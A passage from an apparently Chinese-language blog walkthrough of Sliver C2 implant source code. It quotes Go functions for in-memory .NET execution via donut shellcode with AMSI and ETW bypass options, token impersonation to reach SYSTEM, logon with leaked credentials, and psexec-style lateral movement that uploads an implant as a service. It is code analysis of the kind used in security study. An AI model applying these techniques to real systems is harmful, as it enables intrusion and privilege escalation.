href="#0x03-ExecuteAssembly" class="headerlink" title="0x03 ExecuteAssembly"></a>0x03 ExecuteAssembly</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExecuteAssembly的作用是内存执行Donot文件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>https://github.com/BishopFox/sliver/blob/v1.5.30/server/rpc/rpc-tasks.go</code>的<code>ExecuteAssembly</code>是<code>ExecuteAssembly</code>的Main函数，首先会调用位于<code>https://github.com/BishopFox/sliver/blob/a8a36dd6e2c9796c51ab6983b5b615d19c6a6995/server/generate/donut.go</code>的<code>DonutFromAssembly</code>函数填充一些诸如<code>donutArch</code> , <code>Method</code>配置文件,然后填充ShellCode。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">func (rpc *Server) ExecuteAssembly(ctx context<span class="selector-class">.Context</span>, req *sliverpb.ExecuteAssemblyReq) (*sliverpb<span class="selector-class">.ExecuteAssembly</span>, error) </div><div class="line">&#123;</div><div class="line">[....]</div><div class="line">shellcode, err := generate.DonutFromAssembly(</div><div class="line">req<span class="selector-class">.Assembly</span>,</div><div class="line">req<span class="selector-class">.IsDLL</span>,</div><div class="line">req<span class="selector-class">.Arch</span>,</div><div class="line">req<span class="selector-class">.Arguments</span>,</div><div class="line">req<span class="selector-class">.Method</span>,</div><div class="line">req<span class="selector-class">.ClassName</span>,</div><div class="line">req<span class="selector-class">.AppDomain</span>,</div><div class="line">)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">tasksLog.Errorf(<span class="string">"Execute assembly failed: %s"</span>, err)</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">resp := &amp;sliverpb.ExecuteAssembly&#123;Response: &amp;commonpb.Response&#123;&#125;&#125;</div><div class="line"><span class="keyword">if</span> req<span class="selector-class">.InProcess</span> &#123;</div><div class="line">tasksLog.Infof(<span class="string">"Executing assembly in-process"</span>)</div><div class="line">invokeInProcExecAssembly := &amp;sliverpb.InvokeInProcExecuteAssemblyReq&#123;</div><div class="line">Data:       req<span class="selector-class">.Assembly</span>,</div><div class="line">Runtime:    req<span class="selector-class">.Runtime</span>,</div><div class="line">Arguments:  strings.Split(req<span class="selector-class">.Arguments</span>, <span class="string">" "</span>),</div><div class="line">AmsiBypass: req<span class="selector-class">.AmsiBypass</span>,</div><div class="line">EtwBypass:  req<span class="selector-class">.EtwBypass</span>,</div><div class="line">Request:    req<span class="selector-class">.Request</span>,</div><div class="line">&#125;</div><div class="line">err = rpc.GenericHandler(invokeInProcExecAssembly, resp)</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">invokeExecAssembly := &amp;sliverpb.InvokeExecuteAssemblyReq&#123;</div><div class="line">Data:        shellcode,</div><div class="line">Process:     req<span class="selector-class">.Process</span>,</div><div class="line">Request:     req<span class="selector-class">.Request</span>,</div><div class="line">PPid:        req<span class="selector-class">.PPid</span>,</div><div class="line">ProcessArgs: req<span class="selector-class">.ProcessArgs</span>,</div><div class="line">&#125;</div><div class="line">err = rpc.GenericHandler(invokeExecAssembly, resp)</div><div class="line"><span class="comment">//</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line">return resp, nil</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ShellCode的生成逻辑是这样的，在<code>https://github.com/BishopFox/sliver/blob/a8a36dd6e2c9796c51ab6983b5b615d19c6a6995/vendor/github.com/Binject/go-donut/donut/donut.go</code>Sandwich函数生成的ShellCode主要包含3部分：<code>shellcode_loader</code>,<code>donut_loader</code>,<code>payload(C#Assembly)</code>。shellcode_loader负责引导eip执行donut_loader，需要跳转payload大小(SizeOf(payload))后执行donut_loader。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sandwich</span><span class="params">(arch DonutArch, payload *bytes.Buffer)</span> <span class="params">(*bytes.Buffer, error)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">Disassembly:</span></div><div class="line"><span class="comment">   0:  e8 call $+</span></div><div class="line"><span class="comment">   1:  xx xx xx xxinstance length</span></div><div class="line"><span class="comment">   5:  [instance]</span></div><div class="line"><span class="comment"> x=5+instanceLen:  0x59pop ecx</span></div><div class="line"><span class="comment">             x+1:  stub preamble + stub (either 32 or 64 bit or both)</span></div><div class="line"><span class="comment">*/</span></div><div class="line">w := <span class="built_in">new</span>(bytes.Buffer)</div><div class="line">instanceLen := <span class="keyword">uint32</span>(payload.Len())</div><div class="line">w.WriteByte(<span class="number">0xE8</span>)</div><div class="line">binary.Write(w, binary.LittleEndian, instanceLen)</div><div class="line"><span class="keyword">if</span> _, err := payload.WriteTo(w); err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">&#125;</div><div class="line">w.WriteByte(<span class="number">0x59</span>)</div><div class="line">picLen := <span class="keyword">int</span>(instanceLen) + <span class="number">32</span></div><div class="line"><span class="keyword">switch</span> arch &#123;</div><div class="line"><span class="keyword">case</span> X32:</div><div class="line">w.WriteByte(<span class="number">0x5A</span>) <span class="comment">// preamble: pop edx, push ecx, push edx</span></div><div class="line">w.WriteByte(<span class="number">0x51</span>)</div><div class="line">w.WriteByte(<span class="number">0x52</span>)</div><div class="line">w.Write(LOADER_EXE_X86)</div><div class="line">picLen += <span class="built_in">len</span>(LOADER_EXE_X86)</div><div class="line"><span class="keyword">case</span> X64:</div><div class="line">w.Write(LOADER_EXE_X64)</div><div class="line">picLen += <span class="built_in">len</span>(LOADER_EXE_X64)</div><div class="line"><span class="keyword">case</span> X84:</div><div class="line">w.WriteByte(<span class="number">0x31</span>) <span class="comment">// preamble: xor eax,eax</span></div><div class="line">w.WriteByte(<span class="number">0xC0</span>)</div><div class="line">w.WriteByte(<span class="number">0x48</span>) <span class="comment">// dec ecx</span></div><div class="line">w.WriteByte(<span class="number">0x0F</span>) <span class="comment">// js dword x86_code (skips length of x64 code)</span></div><div class="line">w.WriteByte(<span class="number">0x88</span>)</div><div class="line">binary.Write(w, binary.LittleEndian, <span class="keyword">uint32</span>(<span class="built_in">len</span>(LOADER_EXE_X64)))</div><div class="line">w.Write(LOADER_EXE_X64)</div><div class="line">w.Write([]<span class="keyword">byte</span>&#123;<span class="number">0x5A</span>, <span class="comment">// in between 32/64 stubs: pop edx</span></div><div class="line"><span class="number">0x51</span>,  <span class="comment">// push ecx</span></div><div class="line"><span class="number">0x52</span>&#125;) <span class="comment">// push edx</span></div><div class="line">w.Write(LOADER_EXE_X86)</div><div class="line">picLen += <span class="built_in">len</span>(LOADER_EXE_X86)</div><div class="line">picLen += <span class="built_in">len</span>(LOADER_EXE_X64)</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">lb := w.Len()</div><div class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; picLen-lb; i++ &#123;</div><div class="line">w.WriteByte(<span class="number">0x0</span>)</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">return</span> w, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;donut_loader是一段ShellCode，其代码位于<a href="https://github.com/TheWover/donut/blob/master/loader/loader.c" target="_blank" rel="external">https://github.com/TheWover/donut/blob/master/loader/loader.c</a>原理如下：</p><ul><li>1&gt; 加载CLR环境</li><li>2&gt; 获取程序域</li><li>3&gt; 装载程序集</li><li>4&gt; 执行程序集</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/v1.<span class="number">5.30</span>/client/<span class="keyword">command</span>/exec/<span class="keyword">execute</span>-assembly.<span class="keyword">go</span></div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/v1.<span class="number">5.30</span>/server/rpc/rpc-tasks.<span class="keyword">go</span></div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/a8a36dd6e2c9796c51ab6983b5b615d19c6a6995/server/generate/donut.go#L57</div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/a8a36dd6e2c9796c51ab6983b5b615d19c6a6995/vendor/github.<span class="keyword">com</span>/Binject/<span class="keyword">go</span>-donut/donut/donut.go#L85</div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/a8a36dd6e2/vendor/github.<span class="keyword">com</span>/Binject/<span class="keyword">go</span>-donut/donut/loader_exe_x86.<span class="keyword">go</span></div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/TheWover/donut/blob/master/loader/loader.<span class="keyword">c</span></div></pre></td></tr></table></figure><h3 id="0x04-getprivs"><a href="#0x04-getprivs" class="headerlink" title="0x04 getprivs"></a>0x04 getprivs</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>https://github.com/BishopFox/sliver/blob/a8a36dd6e2/implant/sliver/priv/priv_windows.go</code>的getprivs作用是根据进程句柄获取进程权限信息，主要分5步</p><ul><li>1）通过<code>GetCurrentProcess</code>获取当前进程Handle。</li><li>2）通过<code>OpenProcessToken</code>打开当前进程Token句柄。</li><li>3）通过<code>GetTokenInformation</code>获取Token信息，包含<code>LUID</code>，<code>attributes</code>,完整性级别。</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">func GetPrivs() ([]PrivilegeInfo, string, string, <span class="keyword">error</span>) </div><div class="line">&#123;</div><div class="line">[....]</div><div class="line"><span class="comment">// Get a handle for the current process</span></div><div class="line">currentProcHandle, <span class="keyword">err</span> := windows.GetCurrentProcess()</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Println(<span class="string">"Could not get a handle for the current process: "</span>, <span class="keyword">err</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> nil, integrity, processName, <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line">[....]</div><div class="line"><span class="comment">// Get the process token from the current process</span></div><div class="line"><span class="keyword">err</span> = windows.OpenProcessToken(currentProcHandle, windows.TOKEN_QUERY, &amp;tokenHandle)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Println(<span class="string">"Could not open process token: "</span>, <span class="keyword">err</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> nil, integrity, processName, <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Get the size of the token information buffer so we know how large of a buffer to allocate</span></div><div class="line"><span class="comment">// This produces an error about a data area passed to the syscall being too small, but</span></div><div class="line"><span class="comment">// we do not care about that because we just want to know how big of a buffer to make</span></div><div class="line">windows.GetTokenInformation(tokenHandle, windows.TokenPrivileges, nil, 0, &amp;tokenInfoBufferSize)</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Make the buffer and get token information</span></div><div class="line"><span class="comment">// Using a bytes Buffer so that we can Read from it later</span></div><div class="line">tokenInfoBuffer := bytes.NewBuffer(make([]byte, tokenInfoBufferSize))</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">err</span> = windows.GetTokenInformation(tokenHandle,</div><div class="line">windows.TokenPrivileges,</div><div class="line">&amp;tokenInfoBuffer.Bytes()[0],</div><div class="line">uint32(tokenInfoBuffer.Len()),</div><div class="line">&amp;tokenInfoBufferSize,</div><div class="line">)</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Println(<span class="string">"Error in call to GetTokenInformation (privileges): "</span>, <span class="keyword">err</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> nil, integrity, processName, <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// The first 32 bits is the number of privileges in the structure</span></div><div class="line"><span class="keyword">var</span> privilegeCount uint32</div><div class="line"><span class="keyword">err</span> = binary.<span class="keyword">Read</span>(tokenInfoBuffer, binary.LittleEndian, &amp;privilegeCount)</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Println(<span class="string">"Could not read the number of privileges from the token information."</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> nil, integrity, processName, <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">The remaining bytes contain the privileges themselves</span></div><div class="line"><span class="comment">LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY]</span></div><div class="line"><span class="comment">Structure of the array: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-luid_and_attributes</span></div><div class="line"><span class="comment">*/</span></div><div class="line">[....]</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Get the process integrity before we leave</span></div><div class="line">integrity, <span class="keyword">err</span> = getProcessIntegrityLevel(tokenHandle)</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="keyword">return</span> privInfo, <span class="string">"Could not determine integrity level"</span>, processName, <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">return</span> privInfo, integrity, processName, nil</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x05-getststem"><a href="#0x05-getststem" class="headerlink" title="0x05 getststem"></a>0x05 getststem</h3><h3 id="0x06-impersonate"><a href="#0x06-impersonate" class="headerlink" title="0x06 impersonate"></a>0x06 impersonate</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用于模拟用户登录(token)，可以利用模拟用户登录来获取SYSTEM<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/priv/priv_windows.go</code>的impersonate方法中，核心是调用ImpersonateLoggedOnUser进行模拟登录，主要分为4步。</p><ul><li>1）首先通过<code>OpenProcess</code>,<code>OpenProcessToken</code>获取进程Token句柄。</li><li>2）通过<code>ImpersonateLoggedOnUser</code>进行模拟登录。</li><li>3）通过<code>DuplicateTokenEx</code>复制令牌，其实只是为了返回一个Token句柄罢了。</li><li>4）分别启用当前进程的线程的”SeAssignPrimaryTokenPrivilege”, “SeIncreaseQuotaPrivilege”权限。</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">func impersonateProcess(pid uint32) (newToken windows.<span class="keyword">Token</span>, <span class="keyword">err</span> <span class="keyword">error</span>) &#123;</div><div class="line"><span class="keyword">var</span> attr windows.SecurityAttributes</div><div class="line"><span class="keyword">var</span> requiredPrivileges = []string&#123;<span class="string">"SeAssignPrimaryTokenPrivilege"</span>, <span class="string">"SeIncreaseQuotaPrivilege"</span>&#125;</div><div class="line">primaryToken, <span class="keyword">err</span> := getPrimaryToken(pid)</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Println(<span class="string">"getPrimaryToken failed:"</span>, <span class="keyword">err</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="built_in">return</span></div><div class="line">&#125;</div><div class="line">defer primaryToken.<span class="keyword">Close</span>()</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">err</span> = syscalls.ImpersonateLoggedOnUser(*primaryToken)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Println(<span class="string">"impersonateLoggedOnUser failed:"</span>, <span class="keyword">err</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="built_in">return</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">err</span> = windows.DuplicateTokenEx(*primaryToken, windows.TOKEN_ALL_ACCESS, &amp;attr, windows.SecurityDelegation, windows.TokenPrimary, &amp;newToken)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Println(<span class="string">"duplicateTokenEx failed:"</span>, <span class="keyword">err</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="built_in">return</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> _, priv := <span class="keyword">range</span> requiredPrivileges &#123;</div><div class="line"><span class="keyword">err</span> = enableCurrentThreadPrivilege(priv)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Println(<span class="string">"Failed to set priv"</span>, priv)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="built_in">return</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="built_in">return</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x07-make-token"><a href="#0x07-make-token" class="headerlink" title="0x07 make-token"></a>0x07 make-token</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用已经泄露的用户信息进行登录形成一个新的token用于登录，在<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/priv/priv_windows.go</code>的MakeToken方法中，核心是调用<code>.LogonUser</code>和<code>ImpersonateLoggedOnUser</code>进行登陆。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">func MakeToken(domain string, username string, password string) <span class="keyword">error</span> &#123;</div><div class="line"><span class="keyword">var</span> <span class="keyword">token</span> windows.<span class="keyword">Token</span></div><div class="line"><span class="comment">//</span></div><div class="line">pd, <span class="keyword">err</span> := windows.UTF16PtrFromString(domain)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line">pu, <span class="keyword">err</span> := windows.UTF16PtrFromString(username)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line">pp, <span class="keyword">err</span> := windows.UTF16PtrFromString(password)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">err</span> = syscalls.LogonUser(pu, pd, pp, syscalls.LOGON32_LOGON_NEW_CREDENTIALS, syscalls.LOGON32_PROVIDER_DEFAULT, &amp;<span class="keyword">token</span>)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Printf(<span class="string">"LogonUser failed: %v\n"</span>, <span class="keyword">err</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">err</span> = syscalls.ImpersonateLoggedOnUser(<span class="keyword">token</span>)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Println(<span class="string">"impersonateLoggedOnUser failed:"</span>, <span class="keyword">err</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">&#125;</div><div class="line">CurrentToken = <span class="keyword">token</span></div><div class="line"><span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x08-psexec"><a href="#0x08-psexec" class="headerlink" title="0x08 psexec"></a>0x08 psexec</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用psexec原理进行命令执行。代码位于<code>https://github.com/BishopFox/sliver/blob/v1.5.30/client/command/exec/psexec.go</code>的PsExecCmd方法。首先会从Profile中读取Service的二进制数据，并上传到目标主机，然后，创建和开启服务即可。Service二进制文件肯定是和正常的Psexec功能差不多。利用管道和拉起的进程通讯。并将结果传入发送给C2。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">func PsExecCmd(ctx *grumble.Context, <span class="built_in">con</span> *console.SliverConsoleClient) &#123;</div><div class="line">session := <span class="built_in">con</span>.ActiveTarget.GetSessionInteractive()</div><div class="line"><span class="keyword">if</span> session == nil &#123;</div><div class="line"><span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">var serviceBinary []byte</div><div class="line">profile := ctx.Flags.<span class="keyword">String</span>(<span class="string">"profile"</span>)</div><div class="line">serviceName := ctx.Flags.<span class="keyword">String</span>(<span class="string">"service-name"</span>)</div><div class="line">serviceDesc := ctx.Flags.<span class="keyword">String</span>(<span class="string">"service-description"</span>)</div><div class="line">binPath := ctx.Flags.<span class="keyword">String</span>(<span class="string">"binpath"</span>)</div><div class="line">customExe := ctx.Flags.<span class="keyword">String</span>(<span class="string">"custom-exe"</span>)</div><div class="line">uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(ctx.Flags.<span class="keyword">String</span>(<span class="string">"binpath"</span>)), <span class="string">"c:"</span>, <span class="string">"C$"</span>))</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> customExe == <span class="string">""</span> &#123;</div><div class="line"><span class="keyword">if</span> profile == <span class="string">""</span> &#123;</div><div class="line"><span class="built_in">con</span>.PrintErrorf(<span class="string">"You need to pass a profile name, see `help psexec` for more info\n"</span>)</div><div class="line"><span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">[....]</div><div class="line">serviceBinary, _ = generate.GetSliverBinary(implantProfile, <span class="built_in">con</span>)</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="comment">// use a custom exe instead of generating a new Sliver</span></div><div class="line">fileBytes, err := os.ReadFile(customExe)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line"><span class="built_in">con</span>.PrintErrorf(<span class="string">"Error reading custom executable '%s'\n"</span>, customExe)</div><div class="line"><span class="keyword">return</span></div><div class="line">&#125;</div><div class="line">serviceBinary = 